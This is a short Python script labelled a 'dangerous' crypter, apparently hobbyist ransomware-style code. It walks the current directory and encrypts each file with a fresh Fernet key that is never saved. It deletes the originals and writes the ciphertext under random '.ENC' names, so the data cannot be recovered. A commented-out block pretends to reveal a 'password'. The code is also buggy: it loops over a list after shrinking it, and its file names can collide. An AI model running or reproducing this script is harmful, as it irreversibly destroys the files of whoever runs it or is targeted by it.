# crypter {< dangerous >}
#import hashlib

from cryptography.fernet import Fernet
import os
import time

import random

# this gets more advanced

li = os.listdir()

KKV = len(li)

li.remove("CRYP ad.py") # + another 2

for BVF in range(KKV):
    NDC = open(li[BVF] , "r")
    V = NDC.read()
    key = Fernet.generate_key()
    fernet = Fernet(key)
    B = fernet.encrypt(V.encode())
    NDC.close()

    os.remove(li[BVF])
    
    VGBH = random.randrange(1000)
    
    NEWF = open(str(VGBH) + ".ENC" , "w")
    NEWF.write(B.decode())
    NEWF.close()

    #time.sleep(10)

    #U = input("wanna see your password ? type y < ")

    #if U == "y":
    #    print("wait")
    #    time.sleep(2)
    #    for g in range(10):
    #        print(str(g) + "0")
    #        time.sleep(1)
    #    print("your password is : " + V)
    #else:
    #    print("error")